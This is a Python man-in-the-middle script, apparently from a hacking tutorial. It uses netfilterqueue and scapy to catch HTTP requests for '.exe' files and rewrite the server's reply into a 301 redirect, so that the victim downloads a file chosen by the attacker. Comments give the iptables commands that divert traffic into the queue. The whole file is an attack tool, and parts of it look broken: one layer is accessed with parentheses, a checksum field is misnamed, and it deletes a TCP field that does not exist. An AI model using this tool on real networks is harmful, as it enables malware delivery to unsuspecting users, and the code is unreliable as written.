#!/usr/bin/env python

# Run the ARP Spoofer program to work as Man In The Middle
# Run the iptables command : iptables -I FORWARD -j NFQUEUE --queue-num 0
# If you are testing on your local machines, then redirect the INPUT & OUTPUT chains.
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
import netfilterqueue
import scapy.all as scapy

acknowledge_list = []


# removing some fields from our response as the values have been modified
# and the length as well as the checksum have changed. So, we can not use the old ones.
# I will remove them by defining a function :
def setting_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksm
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksm
    return packet


def pkt_process(packet):
    # converting the packet into a scapy packet for modification
    pkt_scapy = scapy.IP(packet.get_payload())
    # to check whether a packet contains the HTTP layer or not
    if pkt_scapy.haslayer(scapy.Raw):
        # checking if the destination port is 80, it means that the packet is leaving from our computer
        # and going towards the http port
        if pkt_scapy[scapy.TCP].dport == 80:
            # to check whether there is any exe file in the load field
            if ".exe" in pkt_scapy[scapy.Raw].load:
                print("[*] exe Request")
                # appending values
                acknowledge_list.append(pkt_scapy[scapy.TCP].ack)

        # checking if the source port is 80, it means this packet is leaving from the http port
        elif pkt_scapy(scapy.TCP).sport == 80:
            # eliminating values
            if pkt_scapy[scapy.TCP].seq in acknowledge_list:
                acknowledge_list.remove(pkt_scapy[scapy.TCP].seq)
                print("[*] Replacing File ")
                # Status code:- 1xx: Informational 2xx: Success 3xx: Redirection 4xx: Client Error5xx: Server Error
                # Using 301 status code for this program as we intend to redirect the client’s request.So,
                # I will add the server response of this status code to our program.
                # I just have to replace the Location with the location of the file that I want the user to download.
                modified = setting_load(pkt_scapy,"HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")
                packet.set_payload(str(modified))

    packet.accept()


q = netfilterqueue.NetfilterQueue()
q.bind(0, pkt_process)
q.run()
